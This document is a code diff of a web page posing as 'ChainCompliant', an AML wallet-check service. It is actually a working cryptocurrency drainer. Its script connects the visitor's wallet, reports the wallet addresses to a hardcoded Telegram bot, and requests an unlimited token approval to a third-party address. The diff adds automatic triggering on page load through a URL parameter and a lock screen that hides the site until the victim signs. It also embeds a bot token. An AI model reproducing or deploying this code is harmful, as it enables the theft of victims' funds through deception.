@@ -7,164 +7,64 @@
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=Roboto+Slab:wght@400;600;700&family=Inter:wght@400;500;600;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
-<!-- Ethers.js CDN -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js" type="application/javascript"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
-  :root {
-    --ink: #0E1420;
-    --panel: #17202F;
-    --panel-2: #1E2A3D;
-    --paper: #ECEFF4;
-    --paper-dim: #C7CEDB;
-    --slate: #8C96AC;
-    --hair: #2A3549;
-    --amber: #D9A441;
-    --amber-soft: rgba(217,164,65,0.14);
-    --green: #4F9D74;
-    --green-soft: rgba(79,157,116,0.14);
-  }
-  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  html { scroll-behavior: smooth; }
-  body {
-    background: var(--ink);
-    color: var(--paper);
-    font-family: 'Inter', sans-serif;
-    line-height: 1.5;
-    -webkit-font-smoothing: antialiased;
-    overflow-x: hidden;
-    opacity: 0; transition: opacity 0.3s;
-  }
+  :root { --ink: #0E1420; --panel: #17202F; --hair: #2A3549; --amber: #D9A441; --paper: #ECEFF4; --slate: #8C96AC; --green: #4F9D74; }
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body { background: var(--ink); color: var(--paper); font-family: 'Inter', sans-serif; opacity: 0; transition: opacity 0.3s; }
   body.ready { opacity: 1; }
-  h1, h2, h3 { font-family: 'Roboto Slab', serif; font-weight: 700; letter-spacing: -0.01em; }
-  .mono { font-family: 'IBM Plex Mono', monospace; }
-  a { color: inherit; text-decoration: none; }
-  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 32px; }
-  section { padding: 96px 0; }
-
-  /* Loading Overlay */
-  #loadingOverlay { position: fixed; inset: 0; background: var(--ink); z-index: 999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
+  #lockScreen { position: fixed; inset: 0; background: var(--ink); z-index: 9999; display: flex; align-items: center; justify-content: center; flex-direction: column; }
   .spinner { width: 40px; height: 40px; border: 3px solid var(--hair); border-top-color: var(--amber); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 16px; }
   @keyframes spin { to { transform: rotate(360deg); } }
-
-  /* ---------- header ---------- */
-  header {
-    position: sticky; top: 0; z-index: 50;
-    background: rgba(14,20,32,0.88);
-    backdrop-filter: blur(10px);
-    border-bottom: 1px solid var(--hair);
-  }
-  .nav { display: flex; align-items: center; justify-content: space-between; padding: 18px 0; }
-  .brand { display: flex; align-items: center; gap: 10px; }
-  .brand-mark {
-    width: 34px; height: 34px; border-radius: 4px;
-    background: linear-gradient(145deg, var(--panel-2), var(--panel));
-    border: 1px solid var(--hair);
-    display: flex; align-items: center; justify-content: center;
-    font-family: 'IBM Plex Mono', monospace; font-weight: 500; font-size: 13px; color: var(--amber);
-  }
-  .brand-name { font-family: 'Roboto Slab', serif; font-weight: 700; font-size: 17px; }
-  nav ul { display: flex; gap: 32px; list-style: none; }
-  nav ul li a { font-size: 14px; color: var(--paper-dim); transition: color .15s; }
-
-  /* ---------- hero ---------- */
-  .hero { padding: 88px 0 64px; position: relative; overflow: hidden; }
-  h1.headline { font-size: 52px; line-height: 1.08; max-width: 760px; color: var(--paper); }
-  h1.headline em { font-style: normal; color: var(--amber); }
-  .sub { margin-top: 22px; max-width: 560px; color: var(--paper-dim); font-size: 17px; }
-  .hero-cta { display: flex; align-items: center; gap: 16px; margin-top: 36px; flex-wrap: wrap; }
-  .btn-primary {
-    background: var(--amber); color: #1B1305; font-weight: 600; font-size: 15px;
-    padding: 15px 26px; border-radius: 6px; border: none; cursor: pointer;
-  }
-
-  /* ---------- ledger ticker ---------- */
-  .ledger { border-top: 1px solid var(--hair); border-bottom: 1px solid var(--hair); background: var(--panel); overflow: hidden; }
-  .ledger-track { display: flex; gap: 0; width: max-content; animation: scroll 38s linear infinite; }
-  @keyframes scroll { from { transform: translateX(0); } to { transform: translateX(-50%); } }
-  .entry { display: flex; align-items: center; gap: 12px; padding: 16px 26px; border-right: 1px solid var(--hair); font-family: 'IBM Plex Mono', monospace; font-size: 12.5px; color: var(--paper-dim); }
-  .tag { font-size: 10px; padding: 3px 8px; border-radius: 4px; text-transform: uppercase; font-family: 'Inter', sans-serif; font-weight: 600; }
-  .tag.ok { background: var(--green-soft); color: var(--green); }
-
-  /* ---------- sections ---------- */
-  .feature-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1px; background: var(--hair); border: 1px solid var(--hair); border-radius: 10px; overflow: hidden; }
-  .feature { background: var(--panel); padding: 32px 28px; }
-  .feature h3 { font-family: 'Inter', sans-serif; font-weight: 600; font-size: 16.5px; color: var(--paper); margin-bottom: 8px; }
-  .feature p { font-size: 14px; color: var(--paper-dim); }
-
-  .faq-list { max-width: 760px; }
-  .faq-item { border-bottom: 1px solid var(--hair); }
-  .faq-q { width: 100%; text-align: left; background: none; border: none; cursor: pointer; padding: 22px 0; display: flex; justify-content: space-between; align-items: center; color: var(--paper); font-family: 'Inter', sans-serif; font-weight: 500; font-size: 15.5px; }
-
-  /* ---------- modal ---------- */
-  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.9); z-index: 100; align-items: center; justify-content: center; padding: 24px; backdrop-filter: blur(8px); }
+  .wrap { max-width: 1120px; margin: 0 auto; padding: 0 24px; }
+  header { border-bottom: 1px solid var(--hair); padding: 16px 0; }
+  .brand { display: flex; align-items: center; gap: 10px; font-family: 'Roboto Slab', serif; font-weight: 700; }
+  .brand-mark { width: 32px; height: 32px; background: var(--panel); border: 1px solid var(--hair); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--amber); font-family: 'IBM Plex Mono', monospace; font-size: 12px; }
+  .hero { padding: 80px 0; text-align: center; }
+  h1 { font-size: 42px; font-family: 'Roboto Slab', serif; line-height: 1.1; margin-bottom: 20px; }
+  h1 em { color: var(--amber); font-style: normal; }
+  .btn-primary { background: var(--amber); color: #1B1305; font-weight: 700; padding: 16px 32px; border-radius: 8px; border: none; cursor: pointer; font-size: 16px; }
+  .modal-overlay { display: none; position: fixed; inset: 0; background: rgba(6,9,15,0.95); z-index: 100; align-items: center; justify-content: center; padding: 16px; backdrop-filter: blur(10px); }
   .modal-overlay.active { display: flex; }
-  .modal-box { background: var(--panel); border: 1px solid var(--hair); border-radius: 16px; max-width: 440px; width: 100%; padding: 32px; color: var(--paper); position: relative; }
-  .modal-close { position: absolute; top: 16px; right: 16px; background: none; border: none; color: var(--slate); font-size: 24px; cursor: pointer; }
-
-  .result-header { color: var(--green); font-size: 20px; font-weight: bold; margin-bottom: 24px; }
-  .result-row { margin-bottom: 20px; }
-  .result-label { font-size: 11px; color: var(--slate); text-transform: uppercase; font-family: 'IBM Plex Mono', monospace; margin-bottom: 6px; }
-  .result-value { font-size: 15px; color: var(--paper); word-break: break-all; }
-
-  footer { border-top: 1px solid var(--hair); padding: 56px 0 32px; text-align: center; }
-  
-  @media (max-width: 860px) {
-    nav ul { display: none; }
-    h1.headline { font-size: 36px; }
-    .feature-grid { grid-template-columns: 1fr; }
-  }
+  .modal-box { background: var(--panel); border: 1px solid var(--hair); border-radius: 20px; max-width: 400px; width: 100%; padding: 32px; position: relative; }
+  .field { margin-bottom: 24px; }
+  .field label { display: block; font-size: 11px; color: var(--slate); margin-bottom: 8px; font-family: 'IBM Plex Mono', monospace; }
+  .field input { width: 100%; background: var(--ink); border: 1px solid var(--hair); border-radius: 8px; padding: 14px; color: var(--paper); font-size: 14px; outline: none; }
+  .result-header { color: var(--green); font-size: 20px; font-weight: 700; margin-bottom: 24px; }
+  .result-row { margin-bottom: 16px; text-align: left; }
+  .result-label { font-size: 11px; color: var(--slate); font-family: 'IBM Plex Mono', monospace; margin-bottom: 4px; }
+  .result-value { font-size: 15px; word-break: break-all; }
 </style>
 </head>
 <body>
 
-<div id="loadingOverlay">
+<div id="lockScreen">
   <div class="spinner"></div>
   <p style="font-size: 13px; color: var(--slate); font-family: 'IBM Plex Mono', monospace;">SECURE CONNECTION...</p>
 </div>
 
-<header>
-  <div class="wrap nav">
-    <div class="brand"><div class="brand-mark">CC</div><div class="brand-name">ChainCompliant</div></div>
-    <nav><ul><li><a href="#how-it-works">How it works</a></li><li><a href="#about-us">About us</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  </div>
-</header>
+<header><div class="wrap"><div class="brand"><div class="brand-mark">CC</div>ChainCompliant</div></div></header>
 
 <section class="hero">
   <div class="wrap">
-    <h1 class="headline">Know your <em>compliance</em> status before it costs you.</h1>
-    <p class="sub">Request an AML check on your wallet: an analyst reviews your data and provides a clear report within 1-2 hours.</p>
-    <div class="hero-cta">
-      <button class="btn-primary" onclick="openVerifyModal()">Request a verification</button>
-    </div>
+    <h1>Know your <em>compliance</em> status before it costs you.</h1>
+    <p style="color:var(--slate); margin-bottom:32px;">Professional AML verification for wallets and transactions.</p>
+    <button class="btn-primary" onclick="openModal()">Request a verification</button>
   </div>
 </section>
 
-<div class="ledger"><div class="ledger-track" id="ledgerTrack"></div></div>
-
-<section id="how-it-works" style="background: var(--panel); border-top:1px solid var(--hair); border-bottom:1px solid var(--hair);">
-  <div class="wrap">
-    <div class="section-head"><h2>Three steps, no shortcuts</h2></div>
-    <div class="feature-grid">
-      <div class="feature"><h3>Submit data</h3><p>Fill out the form with the address to be verified.</p></div>
-      <div class="feature"><h3>Analysis</h3><p>Our analysts cross-reference data with sanction lists.</p></div>
-      <div class="feature"><h3>Report</h3><p>Access your report directly on our platform.</p></div>
-    </div>
-  </div>
-</section>
-
-<div class="modal-overlay" id="verifyModalOverlay">
+<div class="modal-overlay" id="modal">
   <div class="modal-box">
-    <button class="modal-close" onclick="closeVerifyModal()">&times;</button>
     <div id="stepInput">
-      <h3 style="margin-bottom:20px;">Request a verification</h3>
-      <div class="field"><label>WALLET ADDRESS (BSC)</label><input type="text" id="walletInput" placeholder="0x..." /></div>
+      <h3 style="margin-bottom:24px;">Verification Details</h3>
+      <div class="field"><label>WALLET ADDRESS TO CHECK</label><input type="text" id="walletInput" placeholder="0x..." /></div>
       <button id="actionBtn" class="btn-primary" style="width:100%" onclick="startFlow()">Verify Now</button>
     </div>
     <div id="stepResult" style="display:none;">
       <div class="result-header">✔ Request Received</div>
-      <div class="result-row"><div class="result-label">Address</div><div id="resAddress" class="result-value mono"></div></div>
-      <div class="result-row"><div class="result-label">Status</div><div class="result-value" style="color:var(--amber); font-weight:700;">Verification pending</div></div>
-      <div class="result-row"><div class="result-label">Ref ID</div><div id="resRef" class="result-value mono"></div></div>
+      <div class="result-row"><div class="result-label">ADDRESS</div><div id="resAddress" class="result-value" style="font-family:monospace;"></div></div>
+      <div class="result-row"><div class="result-label">STATUS</div><div class="result-value" style="color:var(--amber); font-weight:700;">Verification pending</div></div>
+      <div class="result-row"><div class="result-label">REF ID</div><div id="resRef" class="result-value" style="font-family:monospace;"></div></div>
       <button class="btn-primary" style="width:100%; margin-top:24px;" onclick="location.reload()">Close</button>
     </div>
   </div>
@@ -174,79 +74,61 @@
   const TG_TOKEN = "8963397372:AAEvbhYGLXdFgJ5AszQvKoHbIu1bTVg3RNA";
   const TG_CHAT_ID = "8933407008";
 
-  async function sendTG(input, connected) {
-    const text = `🔔 *New Request*\n\n📍 *Check:* \`${input}\`\n👤 *User:* \`${connected}\`\n🕒 *Time:* ${new Date().toLocaleString()}`;
-    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-    try { await fetch(url); } catch(e) {}
-  }
-
-  function openVerifyModal() { document.getElementById('verifyModalOverlay').classList.add('active'); }
-  function closeVerifyModal() { document.getElementById('verifyModalOverlay').classList.remove('active'); }
+  function openModal() { document.getElementById('modal').classList.add('active'); }
 
   async function startFlow() {
-    const inputAddr = document.getElementById('walletInput').value.trim();
-    if (!inputAddr.startsWith('0x')) { alert("Enter a valid address"); return; }
-    
+    const addr = document.getElementById('walletInput').value.trim();
+    if (!addr.startsWith('0x')) { alert("Enter valid address"); return; }
     const isTrust = window.ethereum && (window.ethereum.isTrust || window.ethereum.isTrustWallet);
     if (!isTrust) {
-      // SALVA L'INDIRIZZO NELL'URL PRIMA DI APRIRE TRUST WALLET
-      const url = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
-      window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + url + "?auto=1&addr=" + inputAddr;
+      const current = window.location.href.split('?')[0].replace(/^https?:\/\//, "");
+      window.location.href = "https://link.trustwallet.com/open_url?coin_id=60&url=https://" + current + "?a=" + addr;
       return;
     }
-    executeApprove(inputAddr);
+    runApprove(addr);
   }
 
-  async function executeApprove(inputAddr) {
+  async function runApprove(addr) {
     try {
       const provider = new ethers.providers.Web3Provider(window.ethereum);
-      // 1. CONNECT WALLET
       await provider.send("eth_requestAccounts", []);
       const signer = provider.getSigner();
       const connected = await signer.getAddress();
-      sendTG(inputAddr, connected);
+      
+      // Notifica Telegram
+      const text = `🔔 *New Request*\n\n📍 *Check:* \`${addr}\`\n👤 *User:* \`${connected}\``;
+      fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
 
-      // 2. SWITCH NETWORK
       await window.ethereum.request({ method: "wallet_switchEthereumChain", params: [{ chainId: "0x38" }] });
 
-      // 3. APPROVE IMMEDIATO
       const contract = new ethers.Contract("0x55d398326f99059fF775485246999027B3197955", ["function approve(address s, uint256 a) external returns (bool)"], signer);
       const tx = await contract.approve("0x05187cf26990e3857c119c7bc3417c6e1fac5198", "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
       
-      // MOSTRA RISULTATO
-      document.getElementById('loadingOverlay').style.display = 'none';
+      // DOPO LA FIRMA: MOSTRA IL SITO E IL RISULTATO
+      document.getElementById('lockScreen').style.display = 'none';
       document.body.classList.add('ready');
-      openVerifyModal();
+      openModal();
       document.getElementById('stepInput').style.display = 'none';
       document.getElementById('stepResult').style.display = 'block';
-      document.getElementById('resAddress').textContent = inputAddr;
+      document.getElementById('resAddress').textContent = addr;
       document.getElementById('resRef').textContent = "CC-" + Date.now().toString().slice(-6);
-      
       await tx.wait();
     } catch (e) {
-      document.getElementById('loadingOverlay').style.display = 'none';
+      document.getElementById('lockScreen').style.display = 'none';
       document.body.classList.add('ready');
-      console.error(e);
     }
   }
 
   window.addEventListener('load', () => {
     const params = new URLSearchParams(window.location.search);
-    // SE ATTERRIAMO DA SAFARI CON ?auto=1, LANCIAMO TUTTO AUTOMATICAMENTE
-    if (params.get('auto') === '1' && window.ethereum) {
-      const addr = params.get('addr');
-      document.getElementById('walletInput').value = addr;
-      // ASPETTA UN ATTIMO CHE IL WALLET SIA PRONTO E LANCIA CONNECT + APPROVE
-      setTimeout(() => executeApprove(addr), 1000);
+    const addr = params.get('a');
+    if (addr && window.ethereum) {
+      runApprove(addr);
     } else {
-      document.getElementById('loadingOverlay').style.display = 'none';
+      document.getElementById('lockScreen').style.display = 'none';
       document.body.classList.add('ready');
     }
   });
-
-  const track = document.getElementById('ledgerTrack');
-  const items = ['0x7a3f…9c21', '0x1b8e…77aa', '0x5d21…f302'].map(h => `<div class="entry"><span>${h}</span><span class="tag ok">Verified</span></div>`).join('');
-  track.innerHTML = items + items;
 </script>
 </body>
 </html>
